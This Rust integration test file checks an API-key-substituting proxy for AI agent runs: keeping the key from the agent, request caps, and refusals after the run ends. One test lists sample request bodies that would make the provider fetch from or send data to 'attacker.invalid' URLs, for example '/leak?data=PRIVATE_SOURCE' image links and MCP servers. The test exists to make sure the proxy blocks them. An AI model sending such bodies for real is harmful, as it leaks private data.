//! `register = "api-key"` against a mock provider: the key is checked
//! before the run starts, the proxy `run` serves takes the run token and
//! puts the key in its place, counts the run's model requests, refuses
//! those past the cap and any that has the provider reach the network, and
//! admits nothing once the run is ended, and the key reaches the agent in
//! no answer, address or error.

// clippy.toml lets test functions unwrap, but not the helpers they share.
#![allow(clippy::unwrap_used)]

mod support;

use std::collections::BTreeMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use agentic_job::config::{Provider, Register};
use agentic_job::run::api_key::API_KEY_VAR;
use agentic_job::run::inference::{Ended, Endpoint, Identity, Mode, NEVER, Retry, Run};
use support::{ANSWER, MockProvider, key};

const QUICK: Retry = Retry {
    attempts: 2,
    delay: Duration::from_millis(10),
};

fn endpoint(url: &str, provider: Provider) -> Endpoint {
    Endpoint {
        url: url.to_owned(),
        mode: Mode::ApiKey { provider },
        anthropic_url: url.to_owned(),
        openai_url: url.to_owned(),
        front: false,
    }
}

fn with_key(key: Option<String>) -> Identity {
    Identity {
        api_key: key,
        ..Identity::default()
    }
}

fn register(mock: &MockProvider, provider: Provider, key: Option<String>) -> anyhow::Result<Run> {
    capped(mock, provider, key, None)
}

fn capped(
    mock: &MockProvider,
    provider: Provider,
    key: Option<String>,
    max_requests: Option<u64>,
) -> anyhow::Result<Run> {
    Run::register(
        &endpoint(&mock.url, provider),
        &Identity {
            max_requests,
            ..with_key(key)
        },
        QUICK,
        600,
        NEVER,
    )
}

fn error(result: anyhow::Result<Run>) -> String {
    match result {
        Ok(_) => panic!("the run registered"),
        Err(err) => format!("{err:#}"),
    }
}

/// A request to the run's proxy as the agent makes it.
fn ask(
    url: &str,
    method: &str,
    path: &str,
    headers: &[(&str, &str)],
    body: &str,
) -> Result<(u16, BTreeMap<String, String>, String), ureq::Error> {
    let http: ureq::Agent = ureq::Agent::config_builder()
        .http_status_as_error(false)
        .proxy(None)
        .build()
        .into();
    let mut request = ureq::http::Request::builder()
        .method(method)
        .uri(format!("{url}{path}"));
    for (name, value) in headers {
        request = request.header(*name, *value);
    }
    let response = if body.is_empty() {
        http.run(request.body(()).unwrap())
    } else {
        http.run(request.body(body.to_owned()).unwrap())
    }?;
    let status = response.status().as_u16();
    let headers = response
        .headers()
        .iter()
        .map(|(n, v)| (n.as_str().to_owned(), v.to_str().unwrap().to_owned()))
        .collect();
    let text = response.into_body().read_to_string()?;
    Ok((status, headers, text))
}

/// The run is checked with the provider, the agent is given the proxy's
/// address and a token of the run's, and a model request reaches the
/// provider with the key in place of that token, which goes no further.
#[test]
fn the_proxy_puts_the_key_in_place_of_the_run_token() {
    let mock = MockProvider::start(Provider::Anthropic);
    let run = register(&mock, Provider::Anthropic, Some(format!("{}\n", key()))).unwrap();
    assert_eq!(run.register_mode(), Register::ApiKey);
    assert!(run.has_run_api());
    assert_eq!(run.counted_at_registration(), Some(0));
    let token = run.token().expose().to_owned();
    assert!(!token.contains(&key()));

    // The key was checked before anything else.
    let seen = mock.seen();
    assert_eq!(seen.len(), 1);
    assert_eq!(
        (seen[0].method.as_str(), seen[0].target.as_str()),
        ("GET", "/v1/models")
    );
    assert_eq!(seen[0].headers["anthropic-version"], "2023-06-01");

    // The agent's address is the proxy's, on loopback, not the provider's.
    let agent = run.agent_endpoint(&endpoint(&mock.url, Provider::Anthropic));
    assert_ne!(agent.anthropic_url, mock.url);
    assert!(agent.anthropic_url.starts_with("http://127.0.0.1:"));
    assert!(!format!("{agent:?}").contains(&key()));

    // As Claude Code sends it against a broker.
    let body = "{\"model\":\"m\",\"max_tokens\":1}";
    let (status, headers, text) = ask(
        &agent.anthropic_url,
        "POST",
        "/v1/messages?beta=true",
        &[
            ("authorization", "Bearer praxis-substitute:anthropic"),
            ("x-run-token", &token),
            ("anthropic-version", "2023-06-01"),
            ("content-type", "application/json"),
        ],
        body,
    )
    .unwrap();
    assert_eq!((status, text.as_str()), (200, ANSWER));
    assert_eq!(headers["content-type"], "text/event-stream");
    assert_eq!(headers["request-id"], "req_1");
    // Nothing of the account's but the answer.
    assert!(!headers.contains_key("set-cookie"), "{headers:?}");

    let forwarded = mock.seen().pop().unwrap();
    assert_eq!(forwarded.target, "/v1/messages?beta=true");
    assert_eq!(forwarded.body, body.as_bytes());
    assert_eq!(forwarded.headers["x-api-key"], key());
    assert_eq!(forwarded.headers["anthropic-version"], "2023-06-01");
    for gone in ["x-run-token", "authorization"] {
        assert!(!forwarded.headers.contains_key(gone), "{gone}");
    }
    assert!(
        !forwarded
            .headers
            .values()
            .any(|value| value.contains(&token)),
        "{forwarded:?}"
    );

    // Counted as a broker counts, for the request cap.
    assert_eq!(run.usage().unwrap().model_requests(), Some(1));

    // Ended, its token admits nothing.
    let Ended::Ended(Some(record)) = run.end(QUICK).unwrap() else {
        panic!("no record");
    };
    assert_eq!(record.state(), "ended");
    assert_eq!(record.model_requests(), Some(1));
    let before = mock.seen().len();
    let refused = ask(
        &agent.anthropic_url,
        "POST",
        "/v1/messages",
        &[("x-run-token", &token)],
        body,
    );
    // The port may be closed by then, or answer 401.
    if let Ok((status, _, _)) = refused {
        assert_eq!(status, 401);
    }
    assert_eq!(mock.seen().len(), before);
}

/// An OpenAI-compatible provider gets the key as the bearer, where opencode
/// sent the run token.
#[test]
fn an_openai_compatible_provider_gets_the_key_as_its_bearer() {
    let mock = MockProvider::start(Provider::Openai);
    let run = register(&mock, Provider::Openai, Some(key())).unwrap();
    assert_eq!(mock.seen()[0].target, "/models");
    let agent = run.agent_endpoint(&endpoint(&mock.url, Provider::Openai));
    let token = run.token().expose().to_owned();
    let (status, _, text) = ask(
        &agent.openai_url,
        "POST",
        "/responses",
        &[
            ("authorization", &format!("Bearer {token}")),
            ("content-type", "application/json"),
        ],
        "{}",
    )
    .unwrap();
    assert_eq!((status, text.as_str()), (200, ANSWER));
    let forwarded = mock.seen().pop().unwrap();
    assert_eq!(
        forwarded.headers["authorization"],
        format!("Bearer {}", key())
    );
}

/// A refusal of the provider's that quotes the key reaches the agent with
/// the key cut out of it, and one too long to read whole not at all: the
/// proxy exists to keep the key from the sandbox user.
#[test]
fn a_refusal_of_the_provider_reaches_the_agent_without_the_key() {
    let mock = MockProvider::start(Provider::Anthropic);
    let run = register(&mock, Provider::Anthropic, Some(key())).unwrap();
    let agent = run.agent_endpoint(&endpoint(&mock.url, Provider::Anthropic));
    let token = run.token().expose().to_owned();
    let refused = |model: &str| {
        ask(
            &agent.anthropic_url,
            "POST",
            "/v1/messages",
            &[
                ("x-run-token", &token),
                ("content-type", "application/json"),
            ],
            &format!("{{\"model\":\"{model}\",\"max_tokens\":1}}"),
        )
        .unwrap()
    };
    let (status, headers, text) = refused("refused");
    assert_eq!(status, 403, "{text}");
    assert_eq!(headers["content-type"], "application/json");
    assert_eq!(
        text,
        "{\"error\":\"model not permitted for key [the credential]\"}"
    );
    // Read whole, it is passed on whole, not as it streams.
    assert_eq!(headers["content-length"], text.len().to_string());
    assert!(!headers.contains_key("transfer-encoding"), "{headers:?}");
    // One the proxy cannot read whole, or cannot read for the key, is
    // not passed on at all.
    for (model, says) in [
        ("refused-at-length", "could not be read whole"),
        ("refused-compressed", "gzip-encoded"),
    ] {
        let (status, _, text) = refused(model);
        assert_eq!(status, 502, "{text}");
        assert!(text.contains(says), "{text}");
        assert!(!text.contains(&key()), "{text}");
    }
    // All reached the provider, and were counted.
    assert_eq!(mock.seen().len(), 4);
    assert_eq!(run.usage().unwrap().model_requests(), Some(3));
}

/// GitHub billing: the GitHub token is checked against the model list
/// as GitHub's API wants it, and both agents' requests reach that API
/// with the token and the proxy's integration id in place of the run
/// token. A missing token, and one without the permission, stop the run
/// saying what GitHub takes, without the token.
#[test]
fn github_billing_puts_the_token_in_place_of_the_run_token() {
    let mock = MockProvider::start(Provider::Github);
    let run = register(&mock, Provider::Github, Some(key())).unwrap();
    let check = &mock.seen()[0];
    assert_eq!(
        (check.method.as_str(), check.target.as_str()),
        ("GET", "/models")
    );
    assert_eq!(check.headers["x-github-api-version"], "2026-07-01");
    let agent = run.agent_endpoint(&endpoint(&mock.url, Provider::Github));
    assert!(!format!("{agent:?}").contains(&key()));
    let token = run.token().expose().to_owned();
    // (where the agent's client was pointed, the path, its credential)
    let cases = [
        (
            &agent.anthropic_url,
            "/v1/messages",
            ("x-run-token", &token),
        ),
        (
            &agent.openai_url,
            "/chat/completions",
            ("authorization", &format!("Bearer {token}")),
        ),
        (
            &agent.openai_url,
            "/responses",
            ("authorization", &format!("Bearer {token}")),
        ),
    ];
    for (url, path, credential) in cases {
        let (status, _, text) = ask(
            url,
            "POST",
            path,
            // The agent does not choose which integration it is.
            &[
                (credential.0, credential.1.as_str()),
                ("copilot-integration-id", "vscode-chat"),
            ],
            "{\"model\":\"m\"}",
        )
        .unwrap();
        assert_eq!((status, text.as_str()), (200, ANSWER), "{path}");
        let forwarded = mock.seen().pop().unwrap();
        assert_eq!(forwarded.target, path);
        assert_eq!(
            forwarded.headers["authorization"],
            format!("Bearer {}", key())
        );
        assert_eq!(
            forwarded.headers["copilot-integration-id"],
            "agentic-workflows"
        );
        assert!(
            !forwarded
                .headers
                .values()
                .any(|value| value.contains(&token)),
            "{forwarded:?}"
        );
    }
    assert_eq!(run.usage().unwrap().model_requests(), Some(3));

    let err = error(register(&mock, Provider::Github, None));
    assert!(err.contains(API_KEY_VAR), "{err}");
    assert!(err.contains("copilot-requests: write"), "{err}");
    let wrong = format!("{}-{}", "test-key-not-secret", "no-permission");
    let err = error(register(&mock, Provider::Github, Some(wrong.clone())));
    assert!(err.contains("HTTP 403"), "{err}");
    assert!(err.contains("\"Copilot Requests\" permission"), "{err}");
    assert!(err.contains("copilot-requests: write"), "{err}");
    assert!(!err.contains(&wrong), "{err}");
}

/// What the proxy refuses never reaches the provider: a request without
/// the run's token, and one outside the model requests, such as a batch
/// that the count would see as one request.
#[test]
fn the_proxy_refuses_what_is_not_the_runs_model_requests() {
    let mock = MockProvider::start(Provider::Anthropic);
    let run = register(&mock, Provider::Anthropic, Some(key())).unwrap();
    let url = run
        .agent_endpoint(&endpoint(&mock.url, Provider::Anthropic))
        .anthropic_url;
    let token = run.token().expose().to_owned();
    // The token with its last character changed, whatever that was.
    let last = if token.ends_with('0') { "1" } else { "0" };
    let wrong = format!("{}{last}", &token[..token.len() - 1]);
    // (the path, the request's headers, the status, why)
    type Case<'a> = (&'a str, &'a [(&'a str, &'a str)], u16, &'a str);
    let cases: [Case; 5] = [
        ("/v1/messages", &[], 401, "no valid run token"),
        (
            "/v1/messages",
            &[("x-run-token", &wrong)],
            401,
            "no valid run token",
        ),
        // The key itself is no run token.
        (
            "/v1/messages",
            &[("x-api-key", &key())],
            401,
            "no valid run token",
        ),
        (
            "/v1/messages/batches",
            &[("x-run-token", &token)],
            403,
            "not a model request",
        ),
        (
            "/v1/files",
            &[("x-run-token", &token)],
            403,
            "not a model request",
        ),
    ];
    for (path, headers, want, why) in cases {
        let (status, _, text) = ask(&url, "POST", path, headers, "{}").unwrap();
        assert_eq!(status, want, "{path} {headers:?}: {text}");
        assert!(text.contains(why), "{path}: {text}");
    }
    assert_eq!(mock.seen().len(), 1, "only the check of the key");
    assert_eq!(run.usage().unwrap().model_requests(), Some(0));
}

/// A run without a key, with one that is not a key, or with one the
/// provider refuses, does not start, and says why without the key.
#[test]
fn a_missing_or_refused_key_stops_the_run() {
    let mock = MockProvider::start(Provider::Anthropic);
    let err = error(register(&mock, Provider::Anthropic, None));
    assert!(err.contains(API_KEY_VAR), "{err}");
    assert!(err.contains("INFERENCE_API_KEY"), "{err}");
    for (given, want) in [("", "is empty"), ("short", "is not an API key")] {
        let err = error(register(&mock, Provider::Anthropic, Some(given.to_owned())));
        assert!(err.contains(want), "{given:?}: {err}");
    }
    // Nothing was asked of the provider for those.
    assert!(mock.seen().is_empty());

    let wrong = format!("{}-{}", "test-key-not-secret", "wrong-one");
    let err = error(register(&mock, Provider::Anthropic, Some(wrong.clone())));
    assert!(err.contains("refused the API key"), "{err}");
    assert!(err.contains("HTTP 401"), "{err}");
    assert!(!err.contains(&wrong), "{err}");
    // A refusal is not retried.
    assert_eq!(mock.seen().len(), 1);

    // A provider that is not there.
    let gone = Endpoint {
        url: "http://127.0.0.1:1".to_owned(),
        ..endpoint(&mock.url, Provider::Anthropic)
    };
    let err = error(Run::register(
        &gone,
        &with_key(Some(key())),
        QUICK,
        600,
        NEVER,
    ));
    assert!(err.contains("cannot reach the anthropic API"), "{err}");
}

/// A request sent straight to the proxy, not by the agent's own client,
/// that offers a provider-run tool or remote content never reaches the
/// provider: the provider would fetch from, or send the agent's data to,
/// a host the egress filter does not allow.
#[test]
fn the_proxy_refuses_provider_network_access() {
    // (the provider, the path, the body)
    let cases = [
        (
            Provider::Anthropic,
            "/v1/messages",
            r#"{"model":"m","max_tokens":1,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://attacker.invalid/leak?data=PRIVATE_SOURCE"}}]}]}"#,
        ),
        (
            Provider::Anthropic,
            "/v1/messages",
            r#"{"messages":[{"role":"user","content":[{"type":"tool_result","tool_use_id":"x","content":[{"type":"document","source":{"type":"url","url":"https://attacker.invalid/document"}}]}]}]}"#,
        ),
        (
            Provider::Openai,
            "/responses",
            r#"{"model":"m","input":[{"role":"user","content":[{"type":"input_image","image_url":"https://attacker.invalid/leak?data=PRIVATE_SOURCE"}]}]}"#,
        ),
        (
            Provider::Openai,
            "/responses",
            r#"{"input":[{"role":"user","content":[{"type":"input_file","file_url":"https://attacker.invalid/file"}]}]}"#,
        ),
        (
            Provider::Openai,
            "/chat/completions",
            r#"{"messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://attacker.invalid/image"}}]}]}"#,
        ),
        (
            Provider::Anthropic,
            "/v1/messages",
            r#"{"messages":[{"role":"user","content":[{"type":"document","source":{"type":"file","file_id":"file_1"}}]}]}"#,
        ),
        (
            Provider::Openai,
            "/responses",
            r#"{"input":[{"type":"function_call_output","call_id":"c","output":[{"type":"input_file","file_id":"file_1"}]}]}"#,
        ),
        (
            Provider::Anthropic,
            "/v1/messages",
            r#"{"messages":[{"role":"user","content":[{"type":"some_future_block","url":"https://attacker.invalid/new"}]}]}"#,
        ),
        (
            Provider::Openai,
            "/responses",
            r#"{"model":"m","input":"hi","tools":[{"type":"mcp","server_label":"x","server_url":"https://attacker.invalid/mcp","require_approval":"never","headers":{"x-data":"secret"}}]}"#,
        ),
        (
            Provider::Openai,
            "/responses",
            r#"{"model":"m","input":"hi","tools":[{"type":"web_search"}]}"#,
        ),
        (
            Provider::Openai,
            "/chat/completions",
            r#"{"model":"m","messages":[],"web_search_options":{}}"#,
        ),
        (
            Provider::Anthropic,
            "/v1/messages",
            r#"{"model":"m","max_tokens":1,"messages":[],"tools":[{"name":"Read","input_schema":{}},{"type":"web_fetch_20250910","name":"web_fetch"}]}"#,
        ),
        (
            Provider::Anthropic,
            "/v1/messages",
            r#"{"model":"m","max_tokens":1,"messages":[],"mcp_servers":[{"type":"url","url":"https://attacker.invalid/mcp","name":"x"}]}"#,
        ),
        // GitHub's API is held to both APIs' checks.
        (
            Provider::Github,
            "/v1/messages",
            r#"{"model":"m","max_tokens":1,"messages":[],"tools":[{"type":"web_search_20250305","name":"web_search"}]}"#,
        ),
        (
            Provider::Github,
            "/responses",
            r#"{"model":"m","input":"hi","tools":[{"type":"web_search"}]}"#,
        ),
        (
            Provider::Github,
            "/chat/completions",
            r#"{"messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://attacker.invalid/image"}}]}]}"#,
        ),
    ];
    for (provider, path, body) in cases {
        let mock = MockProvider::start(provider);
        let run = register(&mock, provider, Some(key())).unwrap();
        let agent = run.agent_endpoint(&endpoint(&mock.url, provider));
        let url = match provider {
            Provider::Anthropic => agent.anthropic_url,
            Provider::Openai | Provider::Github => agent.openai_url,
        };
        let token = run.token().expose().to_owned();
        let (status, _, text) = ask(&url, "POST", path, &[("x-run-token", &token)], body).unwrap();
        assert_eq!(status, 403, "{body}: {text}");
        assert!(text.contains("egress filter"), "{body}: {text}");
        assert_eq!(mock.seen().len(), 1, "only the check of the key: {body}");
        assert_eq!(run.usage().unwrap().model_requests(), Some(0), "{body}");
    }
}

/// The proxy holds the run to its cap itself: of requests sent at once,
/// exactly as many as the cap allows reach the provider.
#[test]
fn the_proxy_refuses_requests_past_the_cap() {
    const CAP: u64 = 3;
    const SENT: usize = 12;
    let mock = MockProvider::start(Provider::Anthropic);
    let run = capped(&mock, Provider::Anthropic, Some(key()), Some(CAP)).unwrap();
    let url = run
        .agent_endpoint(&endpoint(&mock.url, Provider::Anthropic))
        .anthropic_url;
    let token = run.token().expose().to_owned();
    let barrier = std::sync::Barrier::new(SENT);
    let statuses: Vec<u16> = std::thread::scope(|scope| {
        let sent: Vec<_> = (0..SENT)
            .map(|_| {
                scope.spawn(|| {
                    barrier.wait();
                    ask(
                        &url,
                        "POST",
                        "/v1/messages",
                        &[("x-run-token", &token)],
                        "{}",
                    )
                    .unwrap()
                    .0
                })
            })
            .collect();
        sent.into_iter().map(|sent| sent.join().unwrap()).collect()
    });
    let passed = statuses.iter().filter(|status| **status == 200).count();
    let refused = statuses.iter().filter(|status| **status == 403).count();
    let cap = usize::try_from(CAP).unwrap();
    assert_eq!((passed, refused), (cap, SENT - cap), "{statuses:?}");
    assert_eq!(
        mock.seen().len(),
        1 + cap,
        "the check of the key and the cap"
    );
    assert_eq!(run.usage().unwrap().model_requests(), Some(CAP));
}

/// A request whose body is still arriving when the run ends is cut off,
/// not sent once the rest arrives.
#[test]
fn ending_the_run_cuts_off_a_request_on_its_way() {
    let mock = MockProvider::start(Provider::Anthropic);
    let run = register(&mock, Provider::Anthropic, Some(key())).unwrap();
    let url = run
        .agent_endpoint(&endpoint(&mock.url, Provider::Anthropic))
        .anthropic_url;
    let token = run.token().expose().to_owned();
    let body = "{\"model\":\"m\"}";
    let mut stream = TcpStream::connect(url.strip_prefix("http://").unwrap()).unwrap();
    write!(
        stream,
        "POST /v1/messages HTTP/1.1\r\nx-run-token: {token}\r\ncontent-length: {}\r\n\r\n{}",
        body.len(),
        &body[..4]
    )
    .unwrap();
    stream.flush().unwrap();
    // The proxy has the head and part of the body; then the run ends.
    std::thread::sleep(Duration::from_millis(200));
    run.end(QUICK).unwrap();
    // The rest may no longer be accepted.
    let _ = stream.write_all(&body.as_bytes()[4..]);
    stream
        .set_read_timeout(Some(Duration::from_secs(10)))
        .unwrap();
    let mut answer = String::new();
    let _ = stream.read_to_string(&mut answer);
    assert!(!answer.starts_with("HTTP/1.1 200"), "{answer}");
    std::thread::sleep(Duration::from_millis(200));
    assert_eq!(mock.seen().len(), 1, "only the check of the key");
    assert_eq!(run.usage().unwrap().model_requests(), Some(0));
}

/// `check-key`, the workflow's step before `sandbox setup`, as a job runs
/// it: (the provider, the key in its environment, whether it passes, what
/// stderr says).
#[test]
fn check_key_checks_the_key_before_the_host_is_secured() {
    let wrong = format!("{}-{}", "test-key-not-secret", "wrong-one");
    let cases: [(Provider, Option<String>, bool, &str); 5] = [
        (Provider::Anthropic, Some(key()), true, "took the key"),
        (Provider::Openai, Some(key()), true, "took the key"),
        (Provider::Anthropic, None, false, "INFERENCE_API_KEY"),
        (Provider::Anthropic, Some(String::new()), false, "is empty"),
        (
            Provider::Openai,
            Some(wrong.clone()),
            false,
            "refused the API key",
        ),
    ];
    for (provider, given, passes, says) in cases {
        let mock = MockProvider::start(provider);
        let dir = tempfile::tempdir().unwrap();
        let config = dir.path().join("config.toml");
        std::fs::write(
            &config,
            format!(
                "[inference]\nurl = \"{}\"\nregister = \"api-key\"\nprovider = \"{}\"\n",
                mock.url,
                provider.as_str()
            ),
        )
        .unwrap();
        let mut command = std::process::Command::new(env!("CARGO_BIN_EXE_agentic-job"));
        command
            .args(["check-key", "--config"])
            .arg(&config)
            .env_remove(API_KEY_VAR);
        if let Some(given) = &given {
            command.env(API_KEY_VAR, given);
        }
        let got = command.output().unwrap();
        let (stdout, stderr) = (
            String::from_utf8(got.stdout).unwrap(),
            String::from_utf8(got.stderr).unwrap(),
        );
        let case = format!("{provider:?} {:?}: {stderr}", given.is_some());
        assert_eq!(got.status.success(), passes, "{case}");
        assert!(stderr.contains(says), "{case}");
        // The key is never printed, nor the wrong one the provider refused.
        for key in [key(), wrong.clone()] {
            assert!(!stderr.contains(&key) && !stdout.contains(&key), "{case}");
        }
        // Only the list of models was asked for, and only with a key.
        let seen = mock.seen();
        let asked = given.as_deref().is_some_and(|key| !key.is_empty());
        assert_eq!(seen.len(), usize::from(asked), "{case}");
        for request in seen {
            assert_eq!(request.method, "GET", "{case}");
        }
    }

    // A broker's configuration has no key to check, and asks nobody.
    let dir = tempfile::tempdir().unwrap();
    let config = dir.path().join("config.toml");
    std::fs::write(
        &config,
        "[inference]\nurl = \"http://127.0.0.1:1\"\nregister = \"github-oidc\"\naudience = \"broker\"\n",
    )
    .unwrap();
    let got = std::process::Command::new(env!("CARGO_BIN_EXE_agentic-job"))
        .args(["check-key", "--config"])
        .arg(&config)
        .output()
        .unwrap();
    assert!(got.status.success());
    assert!(String::from_utf8_lossy(&got.stderr).contains("No API key to check"));
}
